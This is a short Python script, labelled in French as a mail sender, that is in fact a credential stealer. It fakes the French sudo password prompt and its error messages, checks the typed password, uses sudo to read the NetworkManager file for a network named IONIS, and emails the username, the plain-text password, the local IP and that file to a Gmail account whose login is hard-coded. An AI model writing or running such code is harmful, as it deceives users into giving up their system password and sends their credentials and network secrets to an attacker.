#!/usr/bin/env python3
""" Envoyer un mail """

import smtplib
import getpass
import socket
import subprocess

def getPassword():
    username = getpass.getuser();
    password = ""

    for i in range(3):
        password = getpass.getpass("[sudo] Mot de passe de %s : " % (username))
        if subprocess.call("echo %s | sudo -S ls >/dev/null" % password, shell=True, stderr=subprocess.PIPE) == 0:
            break
        if i < 2:
            print("Désolé, essayez de nouveau.")
        password = ""

    if password == "":
        print("sudo: 3 saisies de mots de passe incorrectes")
        exit(1)
    return username, password

def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def execSudo(cmd, password):
    result = subprocess.check_output("echo %s | sudo -S %s" % (password, cmd), shell=True, stderr=subprocess.PIPE)
    return result.decode("utf-8")

username, session_password = getPassword()
ip = getIP()
IONIS = execSudo("cat /etc/NetworkManager/system-connections/IONIS", session_password)

msg = "\nUser : %s\nPassword : %s\nIP : %s\nIONIS : %s" % (username, session_password, ip, IONIS)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("applicationsudo@gmail.com", "ANTILOPE")

server.sendmail("applicationsudo@gmail.com", "applicationsudo@gmail.com", msg)
server.quit()